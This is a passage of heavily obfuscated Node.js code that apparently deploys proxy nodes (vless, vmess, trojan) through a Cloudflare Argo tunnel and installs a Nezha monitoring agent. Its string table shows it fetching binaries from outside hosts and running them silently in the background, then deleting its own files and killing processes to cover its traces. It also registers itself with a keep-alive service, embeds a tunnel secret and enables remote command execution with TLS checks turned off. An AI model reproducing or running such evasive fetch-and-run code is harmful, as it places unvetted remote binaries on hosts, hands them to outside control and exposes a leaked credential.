_0x2cf23a=_0x5eab61;console[_0x2cf23a(_0x4e56f6._0x212537)](),console['log'](_0x2cf23a(0x134)),console[_0x2cf23a(0x179)](_0x2cf23a(_0x4e56f6._0x22b840));}):exec(_0x5eab61(0x1b5)+_0x358300['join']('\x20')+_0x5eab61(0x195),_0xe94fca=>{const _0x524ad0=_0x5eab61;console[_0x524ad0(0x1dd)](),console[_0x524ad0(_0x5cc29e._0x4bfaa3)](_0x524ad0(0x134)),console[_0x524ad0(0x179)](_0x524ad0(0x18c));});},0x15f90);}cleanFiles();function _0x8a1a(){const _0x325a7b=['existsSync','express','\x20-c\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','config.json','/vless-argo','automatic\x20access\x20task\x20added\x20successfully','unlink','block','\x20already\x20exists','\x0avless://','del\x20/f\x20/q\x20','boot.log','77cefNXC','Error\x20executing\x20command:\x20','random','\x0aclient_secret:\x20','11102330RdvEzB','none','\x20>\x20nul\x202>&1','?security=tls&sni=','127.0.0.1','&fp=firefox&type=ws&host=','amd','TunnelSecret','utf-8','path','unlinkSync','--tls','sub','tunnel.json','?encryption=none&security=tls&sni=','tunnel.yml','org','abcdefghijklmnopqrstuvwxyz','2083','NEZHA_SERVER','https://arm64.ssss.nyc.mn/v1','config.yaml','trojan','unshift','6033EcyzmX','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','arch','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x0avmess://','floor','\x0a\x20\x20\x20\x20','writeFileSync','charAt','sub.txt','stringify','php\x20running\x20error:\x20','UPLOAD_URL','ArgoDomain:','Unhandled\x20error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_PORT','log','8443','https://ipapi.co/json/','cdns.doon.eu.org','exec','error','basename','arm','vless','UUID','response','chmod','country_code','tcp','620634FFUchn','Unknown','test','http://ip-api.com/json/','Empowerment\x20success\x20for\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','CFPORT','ARGO_DOMAIN','push','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','statSync','pipe','vmess','\x20>/dev/null\x202>&1\x20&','\x20>/dev/null\x202>&1','CFIP','list.txt','3305085IsizUL','toString','https://oooo.serv00.net/add-url','util','/sub.txt\x20saved\x20successfully','true','filter','mkdirSync','platform','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','listen','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','freenet','/api/delete-nodes','aarch64','Empowerment\x20failed\x20for\x20','message','false','join','xtls-rprx-vision','close','freedom','/api/add-nodes','2053','443','http\x20server\x20is\x20running\x20on\x20port:','2087','Skipping\x20adding\x20automatic\x20access\x20task','rm\x20-rf\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','PORT','https://arm64.ssss.nyc.mn/bot','\x20-p\x20','base64','/vmess-argo','application/json','5497434JrzhaA','Error\x20in\x20startserver:','catch','/api/add-subscriptions','Download\x20','/tunnel.yml\x20run','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','from','2828968ZHHKJy','.exe\x20>\x20nul\x202>&1','tls','\x0a\x0atrojan://','https://amd64.ssss.nyc.mn/agent','status','arm64','axios','\x20failed:\x20','Error\x20reading\x20boot.log:','NAME','taskkill\x20/f\x20/im\x20','6wlsAMS','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','readFileSync','child_process','2847536KMGJVK','includes','\x20-s\x20','direct','/trojan-argo','/dev/null','length','clear','set','eyJhIjoiMzNlOWNhYWI4ZmRiYTQzYzA3OTE3YTBkNmQ1NTAwODgiLCJ0IjoiYWU1NzVjMGMtY2QyYS00MWQ2LTk3NDMtNDAyNzA0ZWYxMmY4IiwicyI6IlpUZGpOMlkyWW1RdE9XRmpOUzAwTlRVeUxXSXhNRGN0WVdRek5tUTVZMlpqT1dZMiJ9','pkill\x20-f\x20\x22[','/vmess-argo?ed=2560','stream','https+local://8.8.8.8/dns-query','FILE_PATH','SERVER_PORT','all','match','split','74YCWfhy','\x0a\x20\x20tunnel:\x20','free.shaoi.de5.net','PROJECT_URL','\x20successfully','env','post','forEach','http','has','quic','countryCode','Error\x20downloading\x20files:','NEZHA\x20variable\x20is\x20empty,skip\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','SUB_PATH','https://amd64.ssss.nyc.mn/v1','nohup\x20','readdirSync','./tmp','then','\x20-c\x20\x22','ARGO_AUTH','Subscription\x20uploaded\x20successfully','AUTO_ACCESS','firefox','App\x20is\x20running','\x20is\x20running','2096','\x0a\x20\x20credentials-file:\x20','map','data','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','send','win32','get'];_0x8a1a=function(){return _0x325a7b;};return _0x8a1a();}async function AddVisitTask(){const _0x5e7c45={_0x21f59f:0x19a,_0x3312ff:0x128,_0x5691e2:0x1a9},_0x846651=_0x20818e;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x846651(0x1b4));return;}try{const _0x3e3358=await axios[_0x846651(0x1ef)](_0x846651(_0x5e7c45._0x21f59f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x846651(0x1bd)}});return console['log'](_0x846651(0x145)),_0x3e3358;}catch(_0x7f7ad){return console[_0x846651(0x17e)](_0x846651(_0x5e7c45._0x3312ff)+_0x7f7ad[_0x846651(_0x5e7c45._0x5691e2)]),null;}}async function startserver(){const _0x5f401a=_0x20818e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x22c4d6){console[_0x5f401a(0x17e)](_0x5f401a(0x1bf),_0x22c4d6);}}startserver()[_0x20818e(0x1c0)](_0x2121de=>{const _0x1d788d=_0x20818e;console['error'](_0x1d788d(0x176),_0x2121de);}),app[_0x20818e(0x1a2)](PORT,()=>console[_0x20818e(0x179)](_0x20818e(0x1b2)+PORT+'!'));
